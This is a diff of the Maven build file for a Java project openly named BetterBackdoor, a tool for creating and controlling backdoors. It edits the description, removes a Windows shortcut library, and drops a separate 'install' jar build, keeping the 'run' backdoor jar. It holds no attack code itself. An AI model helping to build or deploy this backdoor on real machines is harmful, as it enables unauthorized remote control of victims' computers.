@@ -11,7 +11,7 @@
 	<artifactId>BetterBackdoor</artifactId>
 	<version>0.0.1-SNAPSHOT</version>
 	<name>BetterBackdoor</name>
-	<description>A backdoor creating and controlling tool.</description>
+	<description>A backdoor with a multitude of features.</description>
 
 	<properties>
 		<java.version>1.8</java.version>
@@ -27,12 +27,6 @@
 			<groupId>org.springframework.boot</groupId>
 			<artifactId>spring-boot-starter-test</artifactId>
 			<scope>test</scope>
-		</dependency>
-
-		<dependency>
-			<groupId>com.github.vatbub</groupId>
-			<artifactId>mslinks</artifactId>
-			<version>1.0.3.1</version>
 		</dependency>
 
 		<dependency>
@@ -73,18 +67,6 @@
 						<configuration>
 							<finalName>run</finalName>
 							<mainClass>com.github.thatcherdev.betterbackdoor.backdoor.Backdoor</mainClass>
-						</configuration>
-						<goals>
-							<goal>repackage</goal>
-						</goals>
-					</execution>
-
-					<execution>
-						<id>install</id>
-						<phase>package</phase>
-						<configuration>
-							<finalName>install</finalName>
-							<mainClass>com.github.thatcherdev.betterbackdoor.install.Install</mainClass>
 						</configuration>
 						<goals>
 							<goal>repackage</goal>
